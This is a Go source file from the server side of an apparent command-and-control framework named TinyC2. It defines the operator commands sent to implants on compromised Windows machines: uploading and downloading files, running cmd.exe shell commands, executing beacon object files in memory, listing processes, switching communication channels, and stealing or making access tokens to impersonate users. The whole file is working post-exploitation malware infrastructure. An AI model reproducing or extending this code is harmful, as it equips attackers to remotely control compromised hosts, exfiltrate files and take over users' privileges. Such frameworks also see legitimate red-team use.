package implant

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"
	"github.com/0xPrimo/TinyC2/server/internal/utils"
)

var CommandList = []Command{
	// upload
	{
		Name:              "upload",
		Description:       "Upload an artifact to machine",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			srcPath := args[1]
			fileName := filepath.Base(srcPath)

			destDir := "."
			if len(args) > 2 && args[2] != "" {
				destDir = args[2]
			}

			destPath := filepath.Join(destDir, fileName)

			data, err := os.ReadFile(srcPath)
			if err != nil {
				return Task{}, fmt.Errorf("read artifact file %q: %w", srcPath, err)
			}

			return Task{
				Cmd:  "upload",
				Args: []any{destPath},
				Artifacts: []Artifact{
					{
						Name: fileName,
						Path: srcPath,
						Data: data,
					},
				},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			println()
			logger.Success("file uploaded successfully")
		},
	},
	// channel_register
	{
		Name:              "channel.register",
		Description:       "Register a new communication channel",
		NumberOfArguments: 1,
		// Example: "channel_register [listener-name]",
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			listener, ok := manager.ListenerGet(args[1])
			if !ok {
				return Task{}, errors.New("listener not found")
			}

			ext, err := manager.ListenerExtension(args[1])
			if err != nil {
				return Task{}, err
			}

			implant, ok := manager.implants.Get(id)
			if !ok {
				return Task{}, errors.New("implant is not registered")
			}

			if implant.channels.Has(args[1]) {
				return Task{}, errors.New("channel already exists")
			}

			implant.ChannelAdd(args[1], &Channel{
				Name:     args[1],
				ID:       listener.ID,
				InUse:    false,
				Fallback: false,
			})

			return Task{
				Cmd:  "channel.register",
				Args: []any{},
				Artifacts: []Artifact{
					{
						Data: ext,
					},
				},
			}, err
		},
		process: func(manager *Manager, id string, result TaskResult) {
			println()
		},
	},
	// channel_unregister
	{
		Name:              "channel.remove",
		Description:       "Unregister a communication channel",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			listener, ok := manager.ListenerGet(args[1])
			if !ok {
				return Task{}, errors.New("listener not found")
			}

			implant, ok := manager.implants.Get(id)
			if !ok {
				return Task{}, errors.New("implant is not registered")
			}

			channel, ok := implant.channels.Get(args[1])
			if !ok {
				return Task{}, errors.New("channel not found")
			}

			if channel.Fallback || channel.InUse {
				return Task{}, errors.New("channel is in use")
			}

			implant.ChannelRemove(args[1])

			return Task{
				Cmd:       "channel.remove",
				Args:      []any{listener.ID},
				Artifacts: []Artifact{},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
		},
	},
	// channel_switch
	{
		Name:              "channel.switch",
		Description:       "Switch communication channel",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			implant, ok := manager.implants.Get(id)
			if !ok {
				return Task{}, errors.New("implant is not registered")
			}

			channel, ok := implant.channels.Get(args[1])
			if !ok {
				return Task{}, errors.New("channel not found")
			}

			if channel.InUse {
				return Task{}, errors.New("channel is in use")
			}

			channel.InUse = false
			return Task{
				Cmd:       "channel.switch",
				Args:      []any{channel.ID},
				Artifacts: []Artifact{},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
		},
	},

	// ps
	{
		Name:              "ps",
		Description:       "List all processes",
		NumberOfArguments: 0,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd:       "ps",
				Args:      []any{},
				Artifacts: []Artifact{},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			var (
				pslist []struct {
					Name    string `json:"name"`
					Account string `json:"account"`
					Pid     uint32 `json:"pid"`
					PPid    uint32 `json:"ppid"`
				}
				rows [][]string
			)

			err := json.Unmarshal([]byte(result.Artifact), &pslist)
			if err != nil {
				logger.Error("error occurred during unmarshaling: %v", err)
				return
			}

			for _, ps := range pslist {
				rows = append(rows, []string{ps.Name, ps.Account, fmt.Sprint(ps.Pid), fmt.Sprint(ps.PPid)})
			}

			fmt.Println()
			utils.PrintTable([]string{"name", "account", "pid", "ppid"}, rows)
		},
	},
	// cd
	{
		Name:              "cd",
		Description:       "Change process working directory",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd:  "cd",
				Args: []any{args[1]},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {},
	},
	// cp
	{
		Name:              "cp",
		Description:       "Copy a file to a directory",
		NumberOfArguments: 2,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd:  "cp",
				Args: []any{args[1], args[2]},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {},
	},
	// shell
	{
		Name:              "shell",
		Description:       "execute shell command via cmd.exe",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			cmdline := strings.Join(args[1:], " ")
			return Task{
				Cmd:  "shell",
				Args: []any{"C:\\Windows\\System32\\cmd.exe /c " + cmdline},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			println()
			logger.Success("received output: \n%s\n", result.Output)
		},
	},
	// download
	{
		Name:              "download",
		Description:       "download artifact from target machine",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd:  "download",
				Args: []any{args[1]},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			var (
				file struct {
					Name string `json:"name"`
					Size uint32 `json:"size"`
					Data string `json:"data"`
				}
			)

			err := json.Unmarshal([]byte(result.Artifact), &file)
			if err != nil {
				logger.Error("error occurred during unmarshaling: %v", err)
				return
			}

			data, err := base64.StdEncoding.DecodeString(file.Data)
			if err != nil {
				logger.Error("failed to decode base64: %v", err)
				return
			}

			err = os.MkdirAll("uploads", 0o755)
			if err != nil {
				logger.Error("failed to create directory: %v", err)
				return
			}

			var filename string
			slshindex := strings.LastIndex(file.Name, `\`)
			if slshindex == -1 {
				filename = file.Name
			} else {
				filename = file.Name[slshindex+1:]
			}

			dest := filepath.Join(
				"uploads",
				filename,
			)

			err = os.WriteFile(dest, data, 0o644)
			if err != nil {
				logger.Error("failed to write to file: %v", err)
				return
			}
		},
	},
	// run
	{
		Name:              "run",
		Description:       "execute a file located in the target machine",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			cmdline := strings.Join(args, " ")
			return Task{
				Cmd:  "run",
				Args: []any{cmdline},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			println()
			logger.Success("received output: \n%s\n", result.Output)
		},
	},
	// TODO: execute-assembly
	// inline-execute
	{
		Name:              "inline-execute",
		Description:       "execute a beacon object file",
		NumberOfArguments: 2,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			bofraw, err := os.ReadFile(args[0])
			if err != nil {
				return Task{}, err
			}

			// pack arguments
			bofargs, err := pack.BofPack(args[1], args[2:])
			if err != nil {
				return Task{}, err
			}

			return Task{
				Cmd:  "inline-execute",
				Args: []any{base64.StdEncoding.EncodeToString(bofargs)},
				Artifacts: []Artifact{
					{
						Data: []byte(base64.StdEncoding.EncodeToString(bofraw)),
					},
				},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			println()
			logger.Success("received output: \n%s\n", result.Output)
		},
	},
	// TODO: job_list
	// TODO: job_stop
	// token_info
	{
		Name:              "token.info",
		Description:       "get current process token info",
		NumberOfArguments: 0,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd: "token.info",
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
			var (
				token struct {
					AccessToken        string `json:"access_token"`
					ImpersonationToken string `json:"impersonation_token"`
				}
			)
			err := json.Unmarshal([]byte(result.Artifact), &token)
			if err != nil {
				logger.Error("error occurred during unmarshaling: %v", err)
				return
			}

			println()
			logger.Success("Process Token Information:")
			logger.Info("\t - Access Token: %s", token.AccessToken)
			logger.Info("\t - Impersonation Token: %s", token.ImpersonationToken)
		},
	},
	// token_rev2self
	{
		Name:              "token.rev2self",
		Description:       "use primary token",
		NumberOfArguments: 0,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd: "token.rev2self",
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {
		},
	},
	// token_make
	{
		Name:              "token.make",
		Description:       "impersonate a user",
		NumberOfArguments: 3,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			return Task{
				Cmd:  "token.make",
				Args: []any{args[1], args[2], args[3]},
			}, nil
		},
	},
	// token_steal
	{
		Name:              "token.steal",
		Description:       "impersonate user token",
		NumberOfArguments: 1,
		execute: func(manager *Manager, id string, args ...string) (Task, error) {
			pid, err := strconv.ParseUint(args[1], 10, 32)
			if err != nil {
				return Task{}, err
			}

			return Task{
				Cmd:  "token.steal",
				Args: []any{pid},
			}, nil
		},
		process: func(manager *Manager, id string, result TaskResult) {},
	},
	// TODO: pivot
}
